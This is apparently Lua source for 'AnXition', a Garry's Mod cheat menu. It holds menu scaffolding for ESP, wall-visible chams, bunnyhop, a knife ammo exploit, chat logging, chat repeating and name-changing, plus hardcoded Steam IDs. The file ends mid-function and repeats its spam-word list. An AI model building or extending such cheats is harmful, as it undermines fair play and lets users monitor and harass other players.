// note by paradox (2/20/2024): DO NOT GO TO THE "Drawlogo" FUNCTION!!!
// Also this is an older version of the base "anxition.lua".

// note by paradox (6/28/2025): GPT says: Code Hell™
/*
Aye aye, here be yer scurvy roast in full pirate tongue, matey:

"Arrr, what devilry be this cursed script ye’ve hoisted on me deck?!"

This be no code, ye landlubber — this be a kraken’s nest of nested dotimers, twistin’ and churnin’ like a sea serpent on grog! I’ve seen barnacles with better structure, and they ain't even got brains!

Ye got ply driftin’ about like a ghost ship with no cap’n — ye forgot to anchor it to LocalPlayer(), ye daft sea slug! Each +attack and -attack be flappin’ like a one-legged parrot in a storm — no rhyme, no rhythm, just pure chaotic sea spray.

By Davy Jones’ beard, this mess be deeper than the Mariana Trench and twice as cursed! If I wanted to torture me crew, I’d tie ‘em to the mast and make ‘em read this madness out loud.

I've seen more elegant battles fought between two drunk crabs!

Final say from yer ol’ Cap’n:
“This code be the Black Spot of Lua — fit only for the brig, or to be cast into the code void where it can do no more harm!”

Now hoist the anchor, burn this scroll, and swear on yer cutlass to never nest dotimer that deep again — or I’ll keelhaul the lot o’ ye! 🏴‍☠️💀
*/


--[[
==================================================
 #######                                           
 #       #####  ###### ###### #####   ####  #    # 
 #       #    # #      #      #    # #    # ##  ## 
 #####   #    # #####  #####  #    # #    # # ## # 
 #       #####  #      #      #    # #    # #    # 
 #       #   #  #      #      #    # #    # #    # 
 #       #    # ###### ###### #####   ####  #    # 
==================================================
--]] 

/******************************
Name: Notify/Prints
Function: Create Notify/Prints
******************************/
function Print ( msg )
	print ("[AnXition]: "..msg)
end

function ChatPrint ( msg, color )
	chat.AddText ( color, "[AnXition] "..msg )
end

function Notify ( msg, time )
	GAMEMODE:AddNotify ( msg, NOTIFY_GENERIC, time )
end

function ND()
	ChatPrint( "This hasn't been made yet!", Color(200,200,0) )
end

/******************************
Name: FrameTime shit
Function: timer frametime shit
******************************/
function dotimer (func)
	timer.Create(" "..math.Rand(math.Rand(1000000,5000),math.Rand(1000000,5000)).." ", 0.1, 1, func)
end

/*****************************
Name: View functions
Function: Create view functions
*****************************/
function Derpview(ply, pos, angles, fov)
    local view = {}
    view.origin = pos
	if !derped then
		view.angles = Angle(angles.pitch+45,angles.yaw,angles.roll)
	elseif derped then
		view.angles = Angle(angles.pitch-45,angles.yaw,angles.roll)
	end
    view.fov = fov
 
    return view
end

function Nodview(ply, pos, angles, fov)
    local view = {}
    view.origin = pos
    view.angles = Angle(0,angles.yaw,angles.roll)
    view.fov = fov
 
    return view
end

--== Add Hook ==--
hooknames = {}
hooktypes = {}
function Addhook( typ, name, func )
	hook.Add(typ, name, func)
	table.insert(hooknames, name)
	table.insert(hooktypes, typ)
end

--== Add ConCom ==--
concomnames = {}
function Addcom( com, func )
	concommand.Add(com, func)
	table.insert(concomnames, com)
end
/*****************************
Name: Tables
Function: Tables
*****************************/
local namelist = 0
local playernamelister = 0
      Repeatplayers = {}
local owner = {"STEAM_0:1:72010149"}
local officers = {"STEAM_0:0:5761011"}
local moderators = {"STEAM_0:0:43915953"}
local members = {
"STEAM_0:0:69348930",
"STEAM_0:1:35688208",
"STEAM_0:1:69145936",
"STEAM_0:1:69497763",
"STEAM_0:0:30402831"
}
local blacklist = {"STEAM_0:0:47814838"}
--== Player ==--
ply												= LocalPlayer()

--== Colors ==--
local red                                       = ( Color(255,0,0,255) )
local lightred                                  = ( Color(255,100,100,255) )
local black                                     = ( Color(0,0,0,255) )
local green                                     = ( Color(0,255,0,255) )
local darkgreen                                 = ( Color(0,200,0,255) )
local white                                     = ( Color(255,255,255,255) )
local blue                                      = ( Color(0,0,255,255) )
local gold                                      = ( Color(255,228,0,255) )
local lightblue                                 = ( Color(116,187,251,255) )

--Transparent--
local tred                                      = ( Color(150,0,0,125) )
local tblack                                    = ( Color(0,0,0,225) )
local tgreen                                    = ( Color(0,150,0,125) )
local tblue                                     = ( Color(0,0,100,240) )
local trans                                     = ( Color(0,0,0,0) )

--Flashing--
flashycolor = Color(250,0,0)
undotable = 0
undohooked = false

Addhook("Think", "flashred", function()
if flashycolor.r >= 0 and flashycolor.r < 250 and !undohooked then
	flashycolor = Color(math.Approach(flashycolor.r, 250, 5),0,0)
elseif flashycolor.r == 250 and !undohooked then
	undohooked = true
	Addhook("Think", "undohook", function()
		if flashycolor.r > 100 then
			flashycolor = Color(flashycolor.r - math.Approach(undotable, 150, 5),0,0)
		else
			undohooked = false
			hook.Remove("Think", "undohook")
			undotable = 0
		end
	end)
end
end)

--== Spam Words ==--
words = { }
words[1] = "hax"
words[2] = "freeman"
words[3] = "figures"
words[4] = "cheese"
words[5] = "cp"
words[6] = "help"
words[7] = "dejavu"
words[8] = "run"
words[9] = "follow"
words[10] = "over here"
words[11] = "hi"
words[12] = "he's dead"
words[13] = "yes"
words[14] = "get in"
words[15] = "omg"
words[16] = "lets go"
words[17] = "too much info"

--== Fonts ==--
surface.CreateFont("Logo",{font = "Georgia", size = 40, weight = 10, antialias = 0})
surface.CreateFont("Info",{font = "Georgia", size = 20, weight = 10, antialias = 0})
surface.CreateFont("Button",{font = "Georgia", size = 25, weight = 10, antialias = 0})
surface.CreateFont("ESPFont",{font = "Georgia", size = 15, weight = 10, antialias = 0})
surface.CreateFont("PlayerInfoFont",{font = "Georgia", size = 20, weight = 10, antialias = 0})

--== DrawInfo ==--
Addhook("HUDPaint", "drawspacetext", function()
	if drawspacetext then
		draw.SimpleTextOutlined ( "Press Backspace to return to normal.", "PlayerInfoFont", ScrW()/2, ScrH()-150, Color( 255,255,255,255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, black )
	end
end)
--Material--
local Matinfo = {
["$basetexture"] = "models/debug/debugwhite",
["$model"]       = 1,
["$nocull"]      = 1,
["$ignorez"]     = 1
}

mat1 = (CreateMaterial( "chams", "VertexLitGeneric", Matinfo ))
mat2 = (CreateMaterial( "wireframe", "Wireframe", Matinfo ))

--== Directorys ==--
if (not file.IsDir("AnXition/ESP", "Data"))
then file.CreateDir("AnXition/ESP")
end

if (not file.IsDir("AnXition/Music", "Data"))
then file.CreateDir("AnXition/Music")
end

if (not file.IsDir("AnXition/Logger", "Data"))
then file.CreateDir("AnXition/Logger")
end

--== Files ==--

if (not file.Exists("AnXition/ESP/Beams.txt", "Data"))
then file.Write("AnXition/ESP/Beams.txt", "") 
end

if (not file.Exists("AnXition/ESP/Ents.txt", "Data"))
then file.Write("AnXition/ESP/Ents.txt", "") 
end

if (not file.Exists("AnXition/Logger/chat.txt", "Data"))
then file.Write("AnXition/Logger/chat.txt", "") 
end

if (not file.Exists("AnXition/Music/names.txt", "Data"))
then file.Write("AnXition/Music/names.txt", "") 
end

if (not file.Exists("AnXition/Music/links.txt", "Data"))
then file.Write("AnXition/Music/links.txt", "") 
end



--== File tables ==--
local ESPEnts 										= string.Explode("%",(file.Read("AnXition/ESP/Ents.txt")))
local Beamplayers									= string.Explode("%",(file.Read("AnXition/ESP/Beams.txt")))
local Musiclinks									= string.Explode("%",(file.Read("AnXition/Music/links.txt")))
local Musicnames									= string.Explode("%",(file.Read("AnXition/Music/names.txt")))


--== Spam Words ==--
words = { }
words[1] = "hax"
words[2] = "freeman"
words[3] = "figures"
words[4] = "cheese"
words[5] = "cp"
words[6] = "help"
words[7] = "dejavu"
words[8] = "run"
words[9] = "follow"
words[10] = "over here"
words[11] = "hi"
words[12] = "he's dead"
words[13] = "yes"
words[14] = "get in"
words[15] = "omg"
words[16] = "lets go"


--== Visible ==--
function Visible( ply )
        if (!IsValid( ply )) then return false end
       
        local vecPos, _ = ply:GetBonePosition( ply:LookupBone( "ValveBiped.Bip01_Head1" ) or 12 );
        local trace = { start = LocalPlayer():EyePos(), endpos = vecPos, filter = LocalPlayer(), mask = MASK_SHOT };
        local traceRes = util.TraceLine( trace );
       
        TraceRes = traceRes;
       
        if (traceRes.HitWorld || traceRes.Entity != ply) then return false end;
        return true;
end


--== Derma stuff ==--
function CreateButton ( title, Parent, visible, x, y, sX, sY, tip, tabl, doclick )
local button = vgui.Create( "DButton" )
button:SetParent( Parent ) 
button:SetText( " " )
button:SetPos( x, y )
button:SetSize( sX, sY )
button:SetVisible( visible )
button:SetTooltip( tip or " " )
button.Paint = function ()
	draw.RoundedBox ( 1, 0, 0, button:GetWide(), button:GetTall(), red )
	draw.RoundedBox ( 0, 1, 1, button:GetWide()-2, button:GetTall()-2, black )
	draw.SimpleTextOutlined ( title, "Button", button:GetWide()/2, button:GetTall()/2, Color( 150,150,150 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
end
button.DoClick = doclick
end

function CreateTabButton ( title, Parent, visible, x, y, sX, sY, tip, color, doclick )
local button = vgui.Create( "DButton" )
button:SetParent( Parent ) 
button:SetText( " " )
button:SetPos( x, y )
button:SetSize( sX, sY )
button:SetVisible( visible )
button:SetTooltip( tip or " " )
button.Paint = function ()
	draw.RoundedBox ( 0, 0, 0, button:GetWide(), button:GetTall(), color )
	draw.SimpleTextOutlined ( title, "DarkRPHUD2", button:GetWide()/2, button:GetTall()/2, Color( 200,200,200 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
	
end
button.DoClick = doclick
end


/******************************
Name: Menu
Function: Create The Menu
******************************/
function Menu()
	frameopened = true
	local MenuFrame = vgui.Create("DFrame")
		MenuFrame:SetSize(ScrW()/2, ScrH()/2)
		MenuFrame:SetPos(ScrW()/4, ScrH()/4)
		MenuFrame:ShowCloseButton( false )
		MenuFrame:MakePopup()
		MenuFrame:SetTitle( "" )
		MenuFrame:SetDraggable( false )
		MenuFrame.Paint = function () 
			draw.RoundedBox ( 0, 100, 0, MenuFrame:GetWide()-100, MenuFrame:GetTall(), tblack )
			draw.RoundedBox ( 0, 100, 0, 150, 30, tblack )
			draw.SimpleTextOutlined ( "AnXition", "Logo", 105, 15, flashycolor, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			draw.SimpleTextOutlined ( "Menu and Scripts", "Info", 260, 15, Color(255,255,255), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			surface.SetDrawColor(Color(255,0,0,255))
			surface.DrawLine ( 100, 0, MenuFrame:GetWide(), 0 )
			surface.DrawLine ( 250, 0, 250, 30 )
			surface.DrawLine ( 100, 30, MenuFrame:GetWide(), 30 )
			surface.DrawLine ( MenuFrame:GetWide()-1, 30, MenuFrame:GetWide()-1, MenuFrame:GetTall() )
			surface.DrawLine ( MenuFrame:GetWide(), MenuFrame:GetTall()-1, 100, MenuFrame:GetTall()-1 )						
		end
		
		
--== Tabs ==--
local Maintab = vgui.Create("DLabel")
Maintab:SetParent( MenuFrame )
Maintab:SetPos( 0 , 0 )
Maintab:SetSize( MenuFrame:GetWide(), MenuFrame:GetTall() )
Maintab:SetText("")
Maintab:SetVisible( true )
Maintab.Paint = function()
	draw.RoundedBox ( 0, 5, 35, 90, 40, tred)
	surface.SetDrawColor(red)
	surface.DrawLine ( 100, 0, 100, 30 )
	surface.DrawLine ( 100, 80, 100, MenuFrame:GetTall() )
	surface.DrawLine ( 100, 30, 0, 30 )
	surface.DrawLine ( 0, 30, 0, 80 )
	surface.DrawLine ( 0, 80, 100, 80 )
	surface.SetDrawColor(black)
	surface.DrawLine ( 100, 90, 0, 90 )
	surface.DrawLine ( 0, 90, 0, 140 )
	surface.DrawLine ( 0, 140, 100, 140 )
	surface.DrawLine ( 100, 150, 0, 150 )
	surface.DrawLine ( 0, 150, 0, 200 )
	surface.DrawLine ( 0, 200, 100, 200 )	
	surface.DrawLine ( 100, 210, 0, 210 )
	surface.DrawLine ( 0, 210, 0, 260 )
	surface.DrawLine ( 0, 260, 100, 260 )
	surface.DrawLine ( 100, 270, 0, 270 )
	surface.DrawLine ( 0, 270, 0, 320 )
	surface.DrawLine ( 0, 320, 100, 320 )	
end	

local ESPtab = vgui.Create("DLabel")
ESPtab:SetParent( MenuFrame )
ESPtab:SetPos( 0 , 0 )
ESPtab:SetSize( MenuFrame:GetWide(), MenuFrame:GetTall() )
ESPtab:SetText("")
ESPtab:SetVisible( false )
ESPtab.Paint = function()
	draw.RoundedBox ( 0, 5, 95, 90, 40, tred)
	surface.SetDrawColor(red)
	surface.DrawLine ( 100, 0, 100, 90 )
	surface.DrawLine ( 100, 140, 100, MenuFrame:GetTall() )
	surface.DrawLine ( 100, 90, 0, 90 )
	surface.DrawLine ( 0, 90, 0, 140 )
	surface.DrawLine ( 0, 140, 100, 140 )	
	surface.SetDrawColor(black)
	surface.DrawLine ( 100, 30, 0, 30 )
	surface.DrawLine ( 0, 30, 0, 80 )
	surface.DrawLine ( 0, 80, 100, 80 )
	surface.DrawLine ( 100, 150, 0, 150 )
	surface.DrawLine ( 0, 150, 0, 200 )
	surface.DrawLine ( 0, 200, 100, 200 )	
	surface.DrawLine ( 100, 210, 0, 210 )
	surface.DrawLine ( 0, 210, 0, 260 )
	surface.DrawLine ( 0, 260, 100, 260 )
	surface.DrawLine ( 100, 270, 0, 270 )
	surface.DrawLine ( 0, 270, 0, 320 )
	surface.DrawLine ( 0, 320, 100, 320 )		
end	

local Aimbottab = vgui.Create("DLabel")
Aimbottab:SetParent( MenuFrame )
Aimbottab:SetPos( 0 , 0 )
Aimbottab:SetSize( MenuFrame:GetWide(), MenuFrame:GetTall() )
Aimbottab:SetText("")
Aimbottab:SetVisible( false )
Aimbottab.Paint = function()
	draw.RoundedBox ( 0, 5, 155, 90, 40, tred)
	surface.SetDrawColor(red)
	surface.DrawLine ( 100, 0, 100, 150 )
	surface.DrawLine ( 100, 200, 100, MenuFrame:GetTall() )
	surface.DrawLine ( 100, 150, 0, 150 )
	surface.DrawLine ( 0, 150, 0, 200 )
	surface.DrawLine ( 0, 200, 100, 200 )
	surface.SetDrawColor(black)
	surface.DrawLine ( 100, 30, 0, 30 )
	surface.DrawLine ( 0, 30, 0, 80 )
	surface.DrawLine ( 0, 80, 100, 80 )
	surface.DrawLine ( 100, 90, 0, 90 )
	surface.DrawLine ( 0, 90, 0, 140 )
	surface.DrawLine ( 0, 140, 100, 140 )
	surface.DrawLine ( 100, 210, 0, 210 )
	surface.DrawLine ( 0, 210, 0, 260 )
	surface.DrawLine ( 0, 260, 100, 260 )
	surface.DrawLine ( 100, 270, 0, 270 )
	surface.DrawLine ( 0, 270, 0, 320 )
	surface.DrawLine ( 0, 320, 100, 320 )		
end	

local Logtab = vgui.Create("DLabel")
Logtab:SetParent( MenuFrame )
Logtab:SetPos( 0 , 0 )
Logtab:SetSize( MenuFrame:GetWide(), MenuFrame:GetTall() )
Logtab:SetText("")
Logtab:SetVisible( false )
Logtab.Paint = function()
	draw.RoundedBox ( 0, 5, 215, 90, 40, tred)
	surface.SetDrawColor(red)
	surface.DrawLine ( 100, 0, 100, 210 )
	surface.DrawLine ( 100, 260, 100, MenuFrame:GetTall() )
	surface.DrawLine ( 100, 210, 0, 210 )
	surface.DrawLine ( 0, 210, 0, 260 )
	surface.DrawLine ( 0, 260, 100, 260 )	
	surface.SetDrawColor(black)
	surface.DrawLine ( 100, 30, 0, 30 )
	surface.DrawLine ( 0, 30, 0, 80 )
	surface.DrawLine ( 0, 80, 100, 80 )
	surface.DrawLine ( 100, 90, 0, 90 )
	surface.DrawLine ( 0, 90, 0, 140 )
	surface.DrawLine ( 0, 140, 100, 140 )
	surface.DrawLine ( 100, 150, 0, 150 )
	surface.DrawLine ( 0, 150, 0, 200 )
	surface.DrawLine ( 0, 200, 100, 200 )
	surface.DrawLine ( 100, 270, 0, 270 )
	surface.DrawLine ( 0, 270, 0, 320 )
	surface.DrawLine ( 0, 320, 100, 320 )		
end		

local MISCtab = vgui.Create("DLabel")
MISCtab:SetParent( MenuFrame )
MISCtab:SetPos( 0 , 0 )
MISCtab:SetSize( MenuFrame:GetWide(), MenuFrame:GetTall() )
MISCtab:SetText("")
MISCtab:SetVisible( false )
MISCtab.Paint = function()
	draw.RoundedBox ( 0, 5, 275, 90, 40, tred)
	surface.SetDrawColor(red)
	surface.DrawLine ( 100, 0, 100, 270 )
	surface.DrawLine ( 100, 260, 100, MenuFrame:GetTall() )
	surface.DrawLine ( 100, 270, 0, 270 )
	surface.DrawLine ( 0, 270, 0, 320 )
	surface.DrawLine ( 0, 320, 100, 320 )	
	surface.SetDrawColor(black)
	surface.DrawLine ( 100, 30, 0, 30 )
	surface.DrawLine ( 0, 30, 0, 80 )
	surface.DrawLine ( 0, 80, 100, 80 )
	surface.DrawLine ( 100, 90, 0, 90 )
	surface.DrawLine ( 0, 90, 0, 140 )
	surface.DrawLine ( 0, 140, 100, 140 )
	surface.DrawLine ( 100, 150, 0, 150 )
	surface.DrawLine ( 0, 150, 0, 200 )
	surface.DrawLine ( 0, 200, 100, 200 )
	surface.DrawLine ( 100, 210, 0, 210 )
	surface.DrawLine ( 0, 210, 0, 260 )
	surface.DrawLine ( 0, 260, 100, 260 )		
end		
		
		
--== ChangeTab ==--
function ChangeTab (tab)
Maintab:SetVisible(false)
ESPtab:SetVisible(false)
Aimbottab:SetVisible(false)
Logtab:SetVisible(false)
MISCtab:SetVisible(false)
tab:SetVisible(true)
end

function CloseFrame()
MenuFrame:Close()
end
/******************************
Name: Buttons
Function: Create Buttons
******************************/

CreateButton ( "Exit", MenuFrame, true, MenuFrame:GetWide()-50, 0, 50, 30, "Exit", notable, function() MenuFrame:Close() opened = false end )

CreateTabButton ( "", MenuFrame, true, 100, 0, 150, 30, "Go to the AnXition Community Page.", trans, function() gui.OpenURL( "http://steamcommunity.com/groups/AnXition" ) end )
CreateTabButton ( "Main", MenuFrame, true, 1, 31, 99, 49, "Main Menu", tblack, function() ChangeTab (Maintab) end )
CreateTabButton ( "ESP", MenuFrame, true, 1, 91, 99, 49, "ESP Menu", tblack, function() ChangeTab (ESPtab) end )
CreateTabButton ( "Aimbot", MenuFrame, true, 1, 151, 99, 49, "Aimbot Menu", tblack, function() ChangeTab (Aimbottab) end )
CreateTabButton ( "Logging", MenuFrame, true, 1, 211, 99, 49, "Loggin Menu", tblack, function() ChangeTab (Logtab) end )
CreateTabButton ( "MISC", MenuFrame, true, 1, 271, 99, 49, "MISC", tblack, function() ChangeTab (MISCtab) end )

--== Main ==--
CreateButton ( "Unload", Maintab, true, Maintab:GetWide()/2-50, 75, 200, 30, "Unload the script", notable, function() Unload() end )
CreateButton ( "Credits", Maintab, true, Maintab:GetWide()/2-50, 115, 200, 30, "Credits", notable, function() Credits() end )
CreateButton ( "Music", Maintab, true, Maintab:GetWide()/2-50, 155, 200, 30, "Open the music player.", notable, function() MusicPlayer() end )
CreateButton ( "Players", Maintab, true, Maintab:GetWide()/2-50, 195, 200, 30, "Open the player list.", notable, function() Playerlist() end )

--== ESP ==--
CreateButton ( "Info", ESPtab, true, ESPtab:GetWide()/2-50, 75, 200, 30, "Toggle PlayerInfo", notable, function() ESP() end )
CreateButton ( "Chams", ESPtab, true, ESPtab:GetWide()/2-50, 115, 200, 30, "Toggle Chams", notable, function() Chams() end )
CreateButton ( "Entities", ESPtab, true, ESPtab:GetWide()/2-50, 155, 200, 30, "Open entity Menu", notable, function() EntityMenu() end )
CreateButton ( "Beams", ESPtab, true, ESPtab:GetWide()/2-50, 195, 200, 30, "Toggle Beams [Add players through playerlist]", notable, function() BeamsFrame() end )

--== Aimbot ==--

--== Logging ==--
CreateButton ( "Chat", Logtab, true, Logtab:GetWide()/2-50, 75, 200, 30, "Toggle Chat Logging.", notable, function() ChatLog() end )

--== MISC ==--
CreateButton ( "Bhop", MISCtab, true, Maintab:GetWide()/2-155, 75, 200, 30, "Toggle Bunnyhop", notable, function() Bunnyhop () end )
CreateButton ( "Repeat", MISCtab, true, Maintab:GetWide()/2-155, 115, 200, 30, "Repeat what players say in chat.", notable, function() RepeatMenu() end )
CreateButton ( "KnifeSup", MISCtab, true, Maintab:GetWide()/2-155, 155, 200, 30, "Use knife exploit to get ammo.", notable, function() Getknifeammo () end )
CreateButton ( "Autoclick", MISCtab, true, Maintab:GetWide()/2-155, 195, 200, 30, "Toggle Autoclicker", notable, function() AutoClick () end )
CreateButton ( "Spam", MISCtab, true, Maintab:GetWide()/2-155, 235, 200, 30, "Open spam Menu.", notable, function() ND () end )

CreateButton ( "Derp", MISCtab, true, Maintab:GetWide()/2+55, 75, 200, 30, "Derp", notable, function() Derp() end )
CreateButton ( "Animation", MISCtab, true, Maintab:GetWide()/2+55, 115, 200, 30, "Start Flexing", notable, function() Animation() end )
CreateButton ( "Namechanger", MISCtab, true, Maintab:GetWide()/2+55, 155, 200, 30, "Start name changing.", notable, function() Namechanger() end )
CreateButton ( "Drawlogo", MISCtab, true, Maintab:GetWide()/2+55, 195, 200, 30, "Use with rope tool, Draw AnXition.", notable, function() Drawlogo() end )

end


--== Main ==--
function Playeroptions(v)
	local Playeroptionsframe = vgui.Create("DFrame")
		Playeroptionsframe:SetSize(ScrW()/2, ScrH()/2)
		Playeroptionsframe:SetPos(ScrW()/4, ScrH()/4)
		Playeroptionsframe:ShowCloseButton( false )
		Playeroptionsframe:MakePopup()
		Playeroptionsframe:SetTitle( "" )
		Playeroptionsframe:SetDraggable( false )
		Playeroptionsframe.Paint = function () 
			draw.RoundedBox ( 0, 0, 0, Playeroptionsframe:GetWide(), Playeroptionsframe:GetTall(), tblack )
			draw.RoundedBox ( 0, 0, 0, Playeroptionsframe:GetWide(), 30, tblack )
			surface.SetDrawColor (red)
			surface.DrawOutlinedRect ( 0, 0, Playeroptionsframe:GetWide(), Playeroptionsframe:GetTall() )	
			surface.DrawOutlinedRect ( 0, 30, Playeroptionsframe:GetWide(), Playeroptionsframe:GetTall() )	
			surface.DrawOutlinedRect ( 25, 100, 250,250 )	
			draw.SimpleTextOutlined ( "AnXition", "Logo", Playeroptionsframe:GetWide()/2, 15, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			draw.SimpleTextOutlined ( v:GetName(), "Logo", Playeroptionsframe:GetWide()/2, 50, Color(200,200,200), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			draw.SimpleTextOutlined ( v:SteamID(), "Info", Playeroptionsframe:GetWide()/2, 75, Color(200,200,200), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )

			
		end
		
	local ShowModel = vgui.Create( "DModelPanel", Playeroptionsframe )
	ShowModel:SetModel( v:GetModel() )
	ShowModel:SetPos(25,100)
	ShowModel:SetSize( 250, 250 )
	ShowModel:SetCamPos( Vector( 50, 50, 50 ) )
	ShowModel:SetLookAt( Vector( 0, 0, 40 ) )
	
	CreateTabButton ( "", Playeroptionsframe, true, Playeroptionsframe:GetWide()/2-100, 65, 200, 20, "Copy.", trans,  function() SetClipboardText(v:SteamID()) end )	
	CreateButton ( "Follow", Playeroptionsframe, true, Playeroptionsframe:GetWide()/2-100, 150, 200, 30, "Follow this person", notable, function() Follow(v) end )
	CreateButton ( "FollowNod", Playeroptionsframe, true, Playeroptionsframe:GetWide()/2-100, 185, 200, 30, "Follow this person while looking retarded", notable, function() FollowNod(v) end )	
	CreateButton ( "Repeat", Playeroptionsframe, true, Playeroptionsframe:GetWide()/2-100, 220, 200, 30, "Add player to repeatlist.", notable, function() table.insert(Repeatplayers, v:SteamID()) ChatPrint(v:GetName().." Added to Repeat list.", red) end )		
	
	CreateButton ( "Spectate", Playeroptionsframe, true, Playeroptionsframe:GetWide()/2+105, 150, 200, 30, "Spectate this person", notable, function() drawspacetext = true
function SpectateView(ply, pos, angles, fov)
    local view = {}
    view.origin = v:GetPos()+Vector(0,0,50)-(angles:Forward()*100)
    view.angles = angles
    view.fov = fov
 
    return view
end
Addhook("CalcView", "Spectate", SpectateView)
Addhook("ShouldDrawLocalPlayer", "ShouldDrawLocalPlayer", function(ply)
Addhook("Think", "stopspectating", function()
	if input.IsKeyDown(KEY_BACKSPACE) then
		drawspacetext = false
		hook.Remove("CalcView", "Spectate")
		hook.Remove("ShouldDrawLocalPlayer", "ShouldDrawLocalPlayer")
		hook.Remove("Think", "stopspectating")
	end
end)
        return true
end)
	end)
	
	CreateButton ( "Beam", Playeroptionsframe, true, Playeroptionsframe:GetWide()/2+105, 185, 200, 30, "Show Beam for this person.", notable, function() AddBeamPlayer(v) end )	
	
	CreateButton ( "Back", Playeroptionsframe, true, Playeroptionsframe:GetWide()/2-25, Playeroptionsframe:GetTall()-40, 50, 30, "Go back to the main menu", notable, function() Playerlist() Playeroptionsframe:Close() end )
	CreateButton ( "Exit", Playeroptionsframe, true, Playeroptionsframe:GetWide()-50, 0, 50, 30, "Exit", notable, function() Playeroptionsframe:Close() opened = false end )
	
end

function Playerlist()
	local Playerlistframe = vgui.Create("DFrame")
		Playerlistframe:SetSize(ScrW()/2, ScrH()/2)
		Playerlistframe:SetPos(ScrW()/4, ScrH()/4)
		Playerlistframe:ShowCloseButton( false )
		Playerlistframe:MakePopup()
		Playerlistframe:SetTitle( "" )
		Playerlistframe:SetDraggable( false )
		Playerlistframe.Paint = function () 
			draw.RoundedBox ( 0, 0, 0, Playerlistframe:GetWide(), Playerlistframe:GetTall(), tblack )
			draw.RoundedBox ( 0, 0, 0, Playerlistframe:GetWide(), 30, tblack )
			surface.SetDrawColor (red)
			surface.DrawOutlinedRect ( 0, 0, Playerlistframe:GetWide(), Playerlistframe:GetTall() )	
			surface.DrawOutlinedRect ( 0, 30, Playerlistframe:GetWide(), Playerlistframe:GetTall() )	
			draw.SimpleTextOutlined ( "AnXition", "Logo", Playerlistframe:GetWide()/2, 15, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			draw.SimpleTextOutlined ( "Players", "Info", Playerlistframe:GetWide()/2, 40, Color(200,200,200), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			
		end
	CreateButton ( "Back", Playerlistframe, true, Playerlistframe:GetWide()/2-25, Playerlistframe:GetTall()-40, 50, 30, "Go back to the main menu", notable, function() Menu() hook.Remove("Think", "checksize") Playerlistframe:Close() end )
	if frameopened then
		CloseFrame()
		frameopened = false
	end		
	CreateButton ( "Exit", Playerlistframe, true, Playerlistframe:GetWide()-50, 0, 50, 30, "Exit", notable, function() hook.Remove("Think", "checksize") Playerlistframe:Close() opened = false end )
	
ScrollList = vgui.Create( "DPanelList", Playerlistframe )
ScrollList:SetPos( 100,100 )
ScrollList:SetSize( Playerlistframe:GetWide()-200,250 )
ScrollList:SetSpacing( 0 ) 
ScrollList:EnableHorizontal( false )
ScrollList:EnableVerticalScrollbar( true ) 

Scrollframe = vgui.Create("DFrame")  
Scrollframe:SetPos( 50,100 ) 
Scrollframe:SetDraggable( false )
Scrollframe:ShowCloseButton( false )
Scrollframe:SetParent(Playerlistframe)
Scrollframe:SetTitle( "" )
Addhook("Think", "checksize", function()
Scrollframe:SetSize( Playerlistframe:GetWide()-200,75 + playernamelister )
end)
Scrollframe:SetText("")
Scrollframe.Paint = function()
	draw.RoundedBox ( 0, 0, 0, Scrollframe:GetWide(), Scrollframe:GetTall(), tblack )
	
	playernamelister = 0
	for k,v in pairs(player.GetAll()) do
			draw.SimpleTextOutlined ( v:GetName(), "Info", 5, 35 + playernamelister, Color(200,200,200), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			surface.SetDrawColor(red)
			surface.DrawLine ( 0, 10+playernamelister, Scrollframe:GetWide(), 10+playernamelister )			
			playernamelister = playernamelister + 50
	end
	

end	
	playerbuttonlister = 0
	for k,v in pairs(player.GetAll()) do
		CreateTabButton ( "", Scrollframe, true, 0, 15 + playerbuttonlister, Playerlistframe:GetWide(), 40, "Open player options for '"..v:GetName().."'", trans,  function() hook.Remove("Think", "checksize") Playerlistframe:Close() Playeroptions(v) end )
		playerbuttonlister = playerbuttonlister + 50
	end
ScrollList:AddItem(Scrollframe)
end
function MusicPlayer()
	local Musicplayerframe = vgui.Create("DFrame")
		Musicplayerframe:SetSize(ScrW()/2, ScrH()/2)
		Musicplayerframe:SetPos(ScrW()/4, ScrH()/4)
		Musicplayerframe:ShowCloseButton( false )
		Musicplayerframe:MakePopup()
		Musicplayerframe:SetTitle( "" )
		Musicplayerframe:SetDraggable( false )
		Musicplayerframe.Paint = function () 
			draw.RoundedBox ( 0, 0, 0, Musicplayerframe:GetWide(), Musicplayerframe:GetTall(), tblack )
			draw.RoundedBox ( 0, 0, 0, Musicplayerframe:GetWide(), 30, tblack )
			surface.SetDrawColor (red)
			surface.DrawOutlinedRect ( 0, 0, Musicplayerframe:GetWide(), Musicplayerframe:GetTall() )	
			surface.DrawOutlinedRect ( 0, 30, Musicplayerframe:GetWide(), Musicplayerframe:GetTall() )	
			draw.SimpleTextOutlined ( "AnXition", "Logo", Musicplayerframe:GetWide()/2, 15, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			draw.SimpleTextOutlined ( "Music Player.", "Info", Musicplayerframe:GetWide()/2, 40, Color(200,200,200), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			
		end
	CreateButton ( "Add Song", Musicplayerframe, true, Musicplayerframe:GetWide()-250, 100, 150, 30, "Add a song.", notable, function() Addsong() Musicplayerframe:Close() end )	
	CreateButton ( "Clear List", Musicplayerframe, true, Musicplayerframe:GetWide()-250, 150, 150, 30, "Clear song list.", notable, function() ClearMusicList() Menu() Musicplayerframe:Close() end )		
